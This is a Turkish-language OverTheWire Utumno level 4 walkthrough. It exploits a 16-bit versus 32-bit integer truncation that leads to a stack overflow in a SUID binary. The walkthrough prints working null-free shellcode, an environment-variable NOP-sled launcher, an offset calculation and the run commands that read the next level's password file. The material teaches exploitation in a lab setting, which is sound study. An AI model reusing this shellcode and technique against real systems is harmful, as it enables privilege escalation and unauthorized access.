# OverTheWire — Utumno Level 4 Çözümü (utumno4 → utumno5)

> Hedef: `utumno4` kullanıcısından `utumno5` kullanıcısının şifresini elde etmek.
> Teknik: **integer truncation** (16-bit kontrol vs 32-bit `memcpy`) → dev stack overflow;
> executable stack'te env-var shellcode + gömülü `cat` komutu.

---

## 1. Bağlantı

```bash
ssh utumno4@utumno.labs.overthewire.org -p 2227
# şifre: **********   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno4
# -r-sr-x--- 1 utumno5 utumno4 12784 utumno4   <-- SUID utumno5, grup utumno4 = OKUNABİLİR
strings /utumno/utumno4 | grep -E 'atoi|memcpy|protector'
#   atoi, memcpy
#   ... -fno-stack-protector ...               <-- canary YOK
readelf -l /utumno/utumno4 | grep GNU_STACK
#   GNU_STACK ... RWE                           <-- stack EXECUTABLE
```
Anahtar fonksiyonlar: **`atoi`** (argv'den sayı) + **`memcpy`** (argv'den kopya). Klasik
"boyutu kullanıcı veriyor" senaryosu.

---

## 3. Statik Analiz — `main` (integer truncation)

```bash
objdump -d -M intel /utumno/utumno4 | sed -n '/<main>:/,/^$/p'
```

Sözde kod:
```c
int main(int argc, char **argv) {
    char buf[0xff02];                 // ebp-0xff02 (stack-clash probing ile büyük frame)
    int  n = atoi(argv[1]);           // [ebp-0x4]  = TAM 32-bit
    short s = (short)n;               // [ebp-0x6]  = düşük 16 bit
    if ((unsigned short)s > 0x3f)     // KONTROL sadece düşük 16 bit'e bakıyor
        exit(1);
    memcpy(buf, argv[2], n);          // ama memcpy TAM 32-bit n kullanıyor  <<< BUG
    return 0;
}
```

**Zafiyet (tip karışıklığı / truncation):**
- Sınır kontrolü `(short)n`'in **düşük 16 bit**'i ile yapılıyor (`<= 0x3f`).
- `memcpy` uzunluğu ise **tam 32-bit `n`**.
- `n = 0x10000 (65536)` → düşük 16 bit = `0x0000` ≤ `0x3f` ⇒ **kontrol geçer**, ama
  `memcpy` **65536 bayt** kopyalar → dev buffer overflow.

**Offset:** `dest = ebp - 0xff02`, return adresi `ebp+4`. Mesafe = `0xff02 + 4 = 0xff06` (65286).
`n = 0x10000` → 65536 bayt kopyalanır, `0xff06`'daki return adresini rahatça ezer.

---

## 4. Strateji

`atoi`/`memcpy` argv'den beslendiği için hedefi **`execve`** ile çağıran bir launcher kullan:
- `argv = {"/utumno/utumno4", "65536", BIGARG, NULL}`
  - `BIGARG` = `0xff06` bayt dolgu + **4 bayt return adresi** + dolgu (toplam `0x10000`).
- Shellcode'u büyük **NOP sled** ile `EGG` env değişkenine koy (stack RWE, ASLR yok).
- Return adresi `EGG` sled'inin ortasını gösterir → shellcode → `cat /etc/utumno_pass/utumno5`.

### Önemli gözlem — env adresi argv boyutundan etkilenmez
Linux stack düzeninde **env string'leri en tepede**, argv string'leri onların **altında**.
Bu yüzden 65536 baytlık dev `argv[2]`, `EGG` env'inin adresini **aşağı itmez** → `environ[0]`
adresi argv boyutundan bağımsız, sabit. (printer ile bulunan adres doğrudan geçerli.)

### Komutu shellcode'a gömme
utumno3'teki gibi: stdin yok, komut gömülü. Null-free shellcode
`/bin/sh -c "cat /etc/utumno_pass/utumno5"`'i stack'te kurar (`utumno4`'ten tek fark:
komut string'inin son dword'ü `"mno5"` → bayt `0x34`→`0x35`).

---

## 5. Final Exploit

### `ex4.c` — launcher
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno5" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x35, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
#define BIGLEN 0x10000
#define RETOFF 0xff06
static char eggenv[4+SLED+256];
static char bigarg[BIGLEN+1];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 unsigned int ret=0x41414141;
 if(argc>=3 && !strcmp(argv[1],"run")) ret=strtoul(argv[2],0,16);
 memset(bigarg,'A',BIGLEN); *(unsigned int*)(bigarg+RETOFF)=ret; bigarg[BIGLEN]=0;
 char *av_run[]={"/utumno/utumno4","65536",bigarg,0};
 char *av_find[]={"/tmp/p2A7xK9mLq","65536",bigarg,0};
 if(argc>=2 && !strcmp(argv[1],"find")) execve("/tmp/p2A7xK9mLq",av_find,envp);
 else execve("/utumno/utumno4",av_run,envp);
 perror("execve"); return 1;
}
```

### `pr.c` (env adres bulucu)
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Çalıştırma
```bash
gcc -m32 -o ex4 ex4.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c

ENV0=$(./ex4 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled ortası
./ex4 run "$RET"           # n=65536 -> memcpy taşması -> ret -> sled -> cat
```

Çıktı:
```
ENV0=fffef51f RET=ffff6a53
**********
```

---

## 6. Doğrulama

```bash
ssh utumno5@utumno.labs.overthewire.org -p 2227
# şifre: **********
```
```
uid=16005(utumno5) gid=16005(utumno5) groups=16005(utumno5)
$ cat /etc/utumno_pass/utumno5
**********
```
✅ Başarılı.

---

## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **Integer truncation** | Kontrol `(short)n` (16-bit), kullanım `memcpy(...,n)` (32-bit) → uyumsuzluk |
| **Bypass değeri** | `n = 0x10000` → düşük 16 bit = 0 ≤ 0x3f geçer, ama 65536 bayt kopyalanır |
| **Offset 0xff06** | `dest = ebp-0xff02`, ret `ebp+4` → mesafe `0xff06` |
| **env stack'in tepesinde** | argv ne kadar büyük olursa olsun env adresi (EGG) sabit kalır |
| **Self-contained shellcode** | utumno3 ile aynı yöntem; komut string'inde `utumno4`→`utumno5` |

